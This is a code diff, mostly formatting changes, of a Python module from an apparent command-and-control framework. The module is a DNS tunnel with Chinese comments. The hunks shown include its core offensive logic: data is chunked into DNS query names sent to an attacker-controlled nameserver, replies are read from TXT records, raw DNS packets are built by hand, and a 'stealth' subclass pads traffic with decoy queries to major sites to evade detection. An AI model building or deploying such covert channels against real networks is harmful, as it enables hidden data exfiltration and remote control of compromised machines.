@@ -16,14 +16,14 @@ DNS 隧道 - DNS Tunnel
     - 抗检测设计
 """
 
+import hashlib
+import logging
+import random
+import secrets
 import socket
 import struct
 import time
-import random
-import secrets
-import hashlib
-import logging
-from typing import Optional, List, Dict, Any
+from typing import Any, Dict, List, Optional
 
 from ..base import BaseTunnel, C2Config
 from ..encoding import C2Encoder, ChunkEncoder
@@ -32,10 +32,11 @@ logger = logging.getLogger(__name__)
 
 # DNS 库
 try:
-    import dns.resolver
     import dns.message
     import dns.query
     import dns.rdatatype
+    import dns.resolver
+
     HAS_DNSPYTHON = True
 except ImportError:
     HAS_DNSPYTHON = False
@@ -69,11 +70,11 @@ class DNSTunnel(BaseTunnel):
 
     # 支持的记录类型
     RECORD_TYPES = {
-        'A': 1,
-        'TXT': 16,
-        'CNAME': 5,
-        'MX': 15,
-        'AAAA': 28,
+        "A": 1,
+        "TXT": 16,
+        "CNAME": 5,
+        "MX": 15,
+        "AAAA": 28,
     }
 
     def __init__(self, config: C2Config):
@@ -88,7 +89,7 @@ class DNSTunnel(BaseTunnel):
         # DNS 配置
         self.domain = config.domain or f"tunnel.{config.server}"
         self.nameserver = config.nameserver or config.server
-        self.record_type = 'TXT'  # 默认使用 TXT 记录
+        self.record_type = "TXT"  # 默认使用 TXT 记录
 
         # 编码器
         self.encoder = C2Encoder()
@@ -179,8 +180,7 @@ class DNSTunnel(BaseTunnel):
                 # 格式: <seq>.<chunk_index>.<total>.<data>.<session>.<domain>
                 self._sequence += 1
                 query_name = (
-                    f"{self._sequence}.{i}.{total}."
-                    f"{chunk}.{self._session_id}.{self.domain}"
+                    f"{self._sequence}.{i}.{total}." f"{chunk}.{self._session_id}.{self.domain}"
                 )
 
                 if not self._send_query(query_name):
@@ -232,7 +232,7 @@ class DNSTunnel(BaseTunnel):
 
         chunks = []
         for i in range(0, len(data), max_chunk):
-            chunks.append(data[i:i + max_chunk])
+            chunks.append(data[i : i + max_chunk])
 
         return chunks
 
@@ -246,7 +246,7 @@ class DNSTunnel(BaseTunnel):
     def _send_dnspython(self, query_name: str) -> bool:
         """使用 dnspython 发送查询"""
         try:
-            self._resolver.resolve(query_name, 'A')
+            self._resolver.resolve(query_name, "A")
             return True
         except dns.resolver.NXDOMAIN:
             # 预期的响应 - 数据已发送
@@ -283,7 +283,7 @@ class DNSTunnel(BaseTunnel):
     def _receive_dnspython(self, query_name: str) -> Optional[bytes]:
         """使用 dnspython 接收数据"""
         try:
-            answers = self._resolver.resolve(query_name, 'TXT')
+            answers = self._resolver.resolve(query_name, "TXT")
 
             # 合并所有 TXT 记录
             data_parts = []
@@ -292,7 +292,7 @@ class DNSTunnel(BaseTunnel):
                     data_parts.append(txt.decode())
 
             if data_parts:
-                combined = ''.join(data_parts)
+                combined = "".join(data_parts)
                 return self.encoder.base32_decode(combined)
 
         except dns.resolver.NXDOMAIN:
@@ -350,10 +350,10 @@ class DNSTunnel(BaseTunnel):
         packet += struct.pack(">HHHH", 1, 0, 0, 0)
 
         # Query name
-        for label in domain.split('.'):
+        for label in domain.split("."):
             if label:
                 packet += struct.pack("B", len(label)) + label.encode()
-        packet += b'\x00'
+        packet += b"\x00"
 
         # Query type and class
         packet += struct.pack(">HH", qtype, 1)
@@ -398,9 +398,9 @@ class DNSTunnel(BaseTunnel):
                     break
 
                 # 类型、类、TTL、长度
-                rtype = struct.unpack(">H", response[offset:offset + 2])[0]
+                rtype = struct.unpack(">H", response[offset : offset + 2])[0]
                 offset += 8
-                rdlength = struct.unpack(">H", response[offset:offset + 2])[0]
+                rdlength = struct.unpack(">H", response[offset : offset + 2])[0]
                 offset += 2
 
                 if rtype == 16:  # TXT
@@ -409,12 +409,12 @@ class DNSTunnel(BaseTunnel):
                         txt_len = response[offset]
                         offset += 1
                         if offset + txt_len <= end:
-                            texts.append(response[offset:offset + txt_len].decode())
+                            texts.append(response[offset : offset + txt_len].decode())
                         offset += txt_len
                 else:
                     offset += rdlength
 
-            return ''.join(texts) if texts else None
+            return "".join(texts) if texts else None
 
         except Exception as e:
             logger.debug(f"Parse TXT response failed: {e}")
@@ -422,6 +422,7 @@ class DNSTunnel(BaseTunnel):
 
 
 # ==================== 高级 DNS 隧道 ====================
+
 
 class StealthDNSTunnel(DNSTunnel):
     """
@@ -438,11 +439,11 @@ class StealthDNSTunnel(DNSTunnel):
 
         # 用于混淆的正常域名
         self._decoy_domains = [
-            'google.com',
-            'facebook.com',
-            'microsoft.com',
-            'amazon.com',
-            'cloudflare.com',
+            "google.com",
+            "facebook.com",
+            "microsoft.com",
+            "amazon.com",
+            "cloudflare.com",
         ]
 
     def send(self, data: bytes) -> bool:
@@ -468,7 +469,7 @@ class StealthDNSTunnel(DNSTunnel):
 
 
 __all__ = [
-    'DNSTunnel',
-    'StealthDNSTunnel',
-    'HAS_DNSPYTHON',
+    "DNSTunnel",
+    "StealthDNSTunnel",
+    "HAS_DNSPYTHON",
 ]
